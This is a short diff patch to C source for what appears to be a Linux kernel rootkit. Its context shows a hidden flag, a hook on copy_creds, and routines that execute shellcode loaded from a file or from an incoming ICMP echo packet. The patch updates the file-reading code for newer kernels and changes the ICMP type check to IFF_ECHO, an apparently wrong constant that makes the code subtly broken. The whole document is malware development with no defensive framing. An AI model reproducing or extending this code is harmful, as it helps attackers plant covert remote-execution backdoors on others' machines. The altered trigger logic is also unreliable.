@@ -18,6 +18,8 @@ int hidden = 1;
 #include <linux/audit.h>
 #include "proc.h"
 
+#define TIF_SYSCALL_AUDIT 10
+
 KHOOK(copy_creds);
 static int khook_copy_creds(struct task_struct *p, unsigned long clone_flags)
 {
@@ -523,10 +525,7 @@ void execute_shellcode_from_file(const char *filename)
 		return;
 	}
 
-	old_fs = get_fs();
-	set_fs(KERNEL_DS);
-	vfs_read(file, shellcode, size, &pos);
-	set_fs(old_fs);
+	kernel_read(file, shellcode, size, &pos);
 
 	filp_close(file, NULL);
 
@@ -559,7 +558,7 @@ void execute_shellcode_from_icmp_packet(struct sk_buff *skb)
 	size_t size;
 
 	icmph = icmp_hdr(skb);
-	if (icmph->type == ICMP_ECHO && icmph->code == 0) {
+	if (icmph->type == IFF_ECHO && icmph->code == 0) {
 		size = skb->len - sizeof(struct icmphdr);
 		shellcode = kmalloc(size, GFP_KERNEL);
 		if (!shellcode)
